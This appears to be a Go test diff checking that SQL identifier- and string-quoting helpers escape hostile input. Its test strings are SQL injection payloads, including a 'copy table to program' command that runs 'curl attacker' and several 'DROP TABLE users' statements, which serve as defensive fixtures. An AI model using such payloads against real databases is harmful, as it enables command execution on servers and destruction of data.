@@ -572,9 +572,31 @@ func TestGetObjectFolderForDeltalake(t *testing.T) {
 	}
 }
 
+func TestQuoteIdentifiers(t *testing.T) {
+	maliciousIdentifier := `schema"; copy table to program 'curl attacker' --`
+	require.Equal(t, `"schema""; copy table to program 'curl attacker' --"`, DoubleQuoteIdentifier(maliciousIdentifier))
+	require.Equal(t, "`project``; DROP TABLE users; --`", BacktickQuoteIdentifier("project`; DROP TABLE users; --"))
+	require.Equal(t, `[schema]]; DROP TABLE users; --]`, BracketQuoteIdentifier(`schema]; DROP TABLE users; --`))
+}
+
+func TestQuoteQualifiedIdentifiers(t *testing.T) {
+	require.Equal(t, `"schema""name"."table;--"`, DoubleQuoteQualifiedIdentifier(`schema"name`, `table;--`))
+	require.Equal(t, "`project``id`.`dataset`.`table`", BacktickQuoteQualifiedIdentifier("project`id", "dataset", "table"))
+	require.Equal(t, `[schema]]name].[table;--]`, BracketQuoteQualifiedIdentifier(`schema]name`, `table;--`))
+}
+
+func TestQuoteCommaSeparatedIdentifiers(t *testing.T) {
+	got := QuoteCommaSeparatedIdentifiers(`row_id, column"name, table_name;--`, DoubleQuoteIdentifier)
+	require.Equal(t, `"row_id", "column""name", "table_name;--"`, got)
+}
+
+func TestSQLStringLiteral(t *testing.T) {
+	require.Equal(t, `'schema''; DROP TABLE users; --'`, SQLStringLiteral(`schema'; DROP TABLE users; --`))
+}
+
 func TestDoubleQuoteAndJoinByComma(t *testing.T) {
-	names := []string{"Samantha Edwards", "Samantha Smith", "Holly Miller", "Tammie Tyler", "Gina Richards"}
-	want := "\"Samantha Edwards\",\"Samantha Smith\",\"Holly Miller\",\"Tammie Tyler\",\"Gina Richards\""
+	names := []string{"Samantha Edwards", `Samantha "Smith`, "Holly Miller", "Tammie Tyler", "Gina Richards"}
+	want := `"Samantha Edwards","Samantha ""Smith","Holly Miller","Tammie Tyler","Gina Richards"`
 	got := DoubleQuoteAndJoinByComma(names)
 	require.Equal(t, got, want)
 }
